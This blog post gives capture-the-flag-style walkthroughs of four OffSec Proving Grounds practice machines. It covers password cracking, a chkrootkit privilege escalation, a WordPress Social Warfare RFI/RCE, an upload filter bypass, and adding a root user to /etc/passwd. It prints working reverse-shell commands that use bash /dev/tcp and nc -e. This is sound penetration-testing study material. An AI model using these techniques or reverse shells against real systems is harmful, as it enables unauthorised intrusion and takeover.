<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef" /><meta property="og:locale" content="en" /><meta name="description" content="Sunset Decoy" /><meta property="og:description" content="Sunset Decoy" /><link rel="canonical" href="https://tanishq.page/blog/posts/oscp-pg-set8/" /><meta property="og:url" content="https://tanishq.page/blog/posts/oscp-pg-set8/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta property="og:image:alt" content="PG Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-19T02:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta name="twitter:image:alt" content="PG Artwork" /><meta property="twitter:title" content="OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-19T02:00:00-05:00","datePublished":"2021-12-19T02:00:00-05:00","description":"Sunset Decoy","headline":"OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef","image":{"alt":"PG Artwork","url":"https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/oscp-pg-set8/"},"url":"https://tanishq.page/blog/posts/oscp-pg-set8/"}</script><title>OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/blog/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/blog/">Tanishq Rupaal</a><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1639897200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 19, 2021 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pg-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pg-cover.jpeg" alt="PG Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PG Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1283 words" > <em>7 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">OffSec PG - Sunset Decoy, Vegeta1, Wpwn, Y0usef</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="sunset-decoy"><span class="me-2">Sunset Decoy</span><a href="#sunset-decoy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.80.85</code></p><h4 id="network-scan"><span class="me-2">Network Scan</span><a href="#network-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.85</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 → <em>Identified file save.zip</em></table></div><h4 id="web-scan"><span class="me-2">Web Scan</span><a href="#web-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.80.85 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>No results were listed.</p><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Retrieved the zip file using <code class="language-plaintext highlighter-rouge">curl http://192.168.80.85/save.zip --output save.zip</code>.</p><p>The zip file is locked. Therefore, cracking with fcrackzip and rockyou password list gives the password as <code class="language-plaintext highlighter-rouge">manuel</code>. Extracting it gives the files passwd, group, hostname, shadow and sudoers from the <code class="language-plaintext highlighter-rouge">/etc/</code> directory.</p><p>The users identified are <code class="language-plaintext highlighter-rouge">root</code> with bash and user <code class="language-plaintext highlighter-rouge">296640a3b825115a47b68fc44501c828</code> with restricted bash.</p><p>The shadow file contains the hashed password for the identified user. Therefore, sending the entry to john for cracking gives the credentials as <code class="language-plaintext highlighter-rouge">296640a3b825115a47b68fc44501c828:server</code>. This can be used for sshing into the server.</p><p>The shell received is a restricted shell. Tries many things to escape from the shell. The only thing that worked was to append <code class="language-plaintext highlighter-rouge">-t "bash"</code> to the ssh command. This allowed the use of <code class="language-plaintext highlighter-rouge">/</code> in commands and therefore <code class="language-plaintext highlighter-rouge">/bin/cat</code>, which gives the user flag.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="https://github.com/DominicBreuker/pspy">PSPY</a> can be run on the machine. This gives a number of processes running. By looking at the output, the process <code class="language-plaintext highlighter-rouge">/bin/sh /root/chkrootkit-0.49/chkrootkit</code> is being run for about 5 seconds every minute. This coincides with the AV scan being run using the honeypot binary in the user’s home directory.</p><p>Searchsploit lists a privilege escalation exploit. This exploit states that a file can be created by the name <code class="language-plaintext highlighter-rouge">update</code> and made executable. It will be executed by <code class="language-plaintext highlighter-rouge">chkrootkit</code> whenever it is run. The file must be placed under the <code class="language-plaintext highlighter-rouge">/tmp/</code> directory.</p><p>Therefore, a reverse shell code can be inserted into the file → <code class="language-plaintext highlighter-rouge">/bin/bash -i &gt;&amp; /dev/tcp/192.168.49.80/3002 0&gt;&amp;1</code>.</p><p>After a minute, a reverse shell is obtained as <code class="language-plaintext highlighter-rouge">root</code>. This gives the root flag.</p><hr /><h2 id="vegeta1"><span class="me-2">Vegeta1</span><a href="#vegeta1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="me-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.72.73</code></p><h4 id="network-scan-1"><span class="me-2">Network Scan</span><a href="#network-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.72.73</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))</table></div><h4 id="web-scan-1"><span class="me-2">Web Scan</span><a href="#web-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.72.73 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>img/ (301)<li>image/ (301)<li>admin/ (301)<li>manual/ (301)<li>server-status (403)<li>bulma/ (301)</ul><p>The robots.txt was checked manually during the scan was running. Robots file reveals a directory called <code class="language-plaintext highlighter-rouge">find_me</code>. This doesn’t contain any useful information either.</p><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>None of the directories were really useful. The login pages inside the <code class="language-plaintext highlighter-rouge">/admin/</code> directory were empty. The <code class="language-plaintext highlighter-rouge">/bulma/</code> directory revealed an audio file in the wav format.</p><p>Uploading the wav file to an online audio decoder shows that the audio is morse code and the text states the presence of a user <code class="language-plaintext highlighter-rouge">trunks</code> with a password <code class="language-plaintext highlighter-rouge">u$3r</code>. This can be used to login to the ssh server running at the target. This gives us the user flag.</p><h3 id="privilege-escalation-1"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Enumerating for <code class="language-plaintext highlighter-rouge">sudo</code> and setuid binaries on the file system, there was no finding apart from the presence of the setuid binary <code class="language-plaintext highlighter-rouge">su</code>. Looked at the bash rc and history files. The history file contained the following interesting entries →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" &gt;&gt; /etc/passwd
</pre></table></code></div></div><p>Checked the permissions of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and indeed the user <code class="language-plaintext highlighter-rouge">Trunks</code> owned the file. This allowed direct manipulation of the file. Therefore, added the above entry to the passwd file. Then logged in as Tom using the password that was encrypted in the above commands.</p><p>This gave the root shell and thereby the root flag.</p><hr /><h2 id="wpwn"><span class="me-2">Wpwn</span><a href="#wpwn" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-2"><span class="me-2">Enumeration</span><a href="#enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.80.123</code></p><h4 id="network-scan-2"><span class="me-2">Network Scan</span><a href="#network-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.123</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))</table></div><h4 id="web-scan-2"><span class="me-2">Web Scan</span><a href="#web-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.80.123 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>Directories/files listed →</p><ul><li>index.html<li>wordpress/</ul><p>Running gobuster again for the wordpress directory gives additional results →</p><ul><li>index.php<li>wp-content/<li>wp-login.php<li>wp-includes/<li>readme.html<li>license.txt<li>wp-trackback.php<li>wp-admin/<li>xmlrpc.php<li>wp-signup.php</ul><p>The folders indicates that an instance of wordpress is running on the web server. Running wpscan on the webserver using the docker image by <code class="language-plaintext highlighter-rouge">docker run -it --rm wpscanteam/wpscan --url http://192.168.80.123/wordpress/</code> gives the following info →</p><ul><li>Directory listing enabled at <code class="language-plaintext highlighter-rouge">/wordpress/wp-content/uploads/</code><li>WP-Cron enabled at <code class="language-plaintext highlighter-rouge">/wordpress/wp-cron.php</code><li>Wordpress version 5.5 using generator tag at <code class="language-plaintext highlighter-rouge">/wordpress/index.php/feed/</code><li>Wordpress theme version 1.5 (latest is 1.8)<li>User <code class="language-plaintext highlighter-rouge">admin</code> identified at <code class="language-plaintext highlighter-rouge">/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</code><li>Outdated plugin Social Warfare 3.5.2 (latest is 4.3) identified at <code class="language-plaintext highlighter-rouge">/wordpress/wp-content/plugins/social-warfare/readme.txt</code></ul><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="rfi-and-rce"><span class="me-2">RFI and RCE</span><a href="#rfi-and-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using searchsploit to search for social warfare gives the result as an RCE for versions &lt; 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in <code class="language-plaintext highlighter-rouge">/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=&lt;RFI_URL&gt;</code>.</p><h4 id="reverse-shell"><span class="me-2">Reverse shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Visiting this page would give the result of the command in the payload url. The payload must be of the form →</p><p><code class="language-plaintext highlighter-rouge">&lt;pre&gt;system('whoami')&lt;/pre&gt;</code>. Checking the existence of netcat and bash, a new payload can be used for a reverse shell → <code class="language-plaintext highlighter-rouge">nc -e /bin/bash 192.168.49.80 3002</code>. This grants the user flag.</p><h3 id="privilege-escalation-2"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user"><span class="me-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The users discovered from the reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code> are <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">takis</code>. Looking through the config of wordpress in <code class="language-plaintext highlighter-rouge">wp-config.php</code>, a DB_password is found. This could be used for the <code class="language-plaintext highlighter-rouge">takis</code> user on ssh. This works and a user shell is obtained.</p><h4 id="root"><span class="me-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The <code class="language-plaintext highlighter-rouge">takis</code> user is able to run sudo without a password for all commands. Therefore <code class="language-plaintext highlighter-rouge">sudo su</code> grants the root shell as well as the root flag.</p><hr /><h2 id="y0usef"><span class="me-2">Y0usef</span><a href="#y0usef" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-3"><span class="me-2">Enumeration</span><a href="#enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.244.138</code></p><h4 id="network-scan-3"><span class="me-2">Network Scan</span><a href="#network-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.138</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.10 ((Ubuntu))</table></div><h4 id="web-scan-3"><span class="me-2">Web Scan</span><a href="#web-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.244.138 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.php<li>icons/ (403)<li>administration/ (403)</ul><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Without much information from the web scan, the possibility to look at headers was apparent. Adding the <code class="language-plaintext highlighter-rouge">X-Forwarded-For: 192.168.244.138</code> header allows loading of the internal <code class="language-plaintext highlighter-rouge">/administration/</code> directory. The header needs to be added to all subsequent requests via burp intercept.</p><p>This directory has a login page which does not have SQLi type injections, however, default credentials of <code class="language-plaintext highlighter-rouge">admin:admin</code> work. The dashboard of the application gives the ability to upload a file, list users or log out. The <code class="language-plaintext highlighter-rouge">.../users</code> page does not list any useful information.</p><p>Note: There was a spelling error in the links, which needed to be modified to get correct response.</p><p>The interesting part was the upload functionality. It could be used to upload a reverse shell. However, the application does not directly allow php files. Bypassing this was checked by renaming the file and adding image headers to the content, but it didn’t work.</p><p>The thing that worked was modifying the <code class="language-plaintext highlighter-rouge">Content-Type</code> header to <code class="language-plaintext highlighter-rouge">image/gif</code>. This allowed the upload of the reverse shell along with the path of the uploaded file. Navigating to the file grants a shell as the <code class="language-plaintext highlighter-rouge">www-data</code> user over netcat. This also gives the user flag.</p><h3 id="privilege-escalation-3"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user-1"><span class="me-2">User</span><a href="#user-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Enumerating the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, the users of importance are <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">yousef</code> and <code class="language-plaintext highlighter-rouge">speech-dispatcher</code>. The <code class="language-plaintext highlighter-rouge">/home/</code> directory contains a file <code class="language-plaintext highlighter-rouge">user.txt</code> file which has a base64 encoded string <code class="language-plaintext highlighter-rouge">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</code>.</p><p>Decoding this gives the credentials <code class="language-plaintext highlighter-rouge">yousef:yousef123</code>. Using this with ssh gives the shell as user <code class="language-plaintext highlighter-rouge">yousef</code>.</p><h4 id="root-1"><span class="me-2">Root</span><a href="#root-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Checking the <code class="language-plaintext highlighter-rouge">sudo -l</code> capabilities of <code class="language-plaintext highlighter-rouge">yousef</code>, it shows that <code class="language-plaintext highlighter-rouge">yousef</code> may run any command as root using <code class="language-plaintext highlighter-rouge">sudo</code>. Therefore, <code class="language-plaintext highlighter-rouge">sudo su</code> grants the root shell and thus, the root flag.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/offsec-proving-grounds/">OffSec Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/offsec-proving-grounds/" class="post-tag no-text-decoration" >offsec-proving-grounds</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OffSec%20PG%20-%20Sunset%20Decoy,%20Vegeta1,%20Wpwn,%20Y0usef%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set8%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OffSec%20PG%20-%20Sunset%20Decoy,%20Vegeta1,%20Wpwn,%20Y0usef%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set8%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set8%2F&text=OffSec%20PG%20-%20Sunset%20Decoy,%20Vegeta1,%20Wpwn,%20Y0usef%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set8%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-npm/">Reverse Proxy in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/go-coding/">The Way to Go(lang)</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgetlord/">Expense Tracking in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-fusion/">Leantime in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/ai-rag/">Exploring RAG (Retrieval-Augmented Generation) and Talking to my Notes</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" 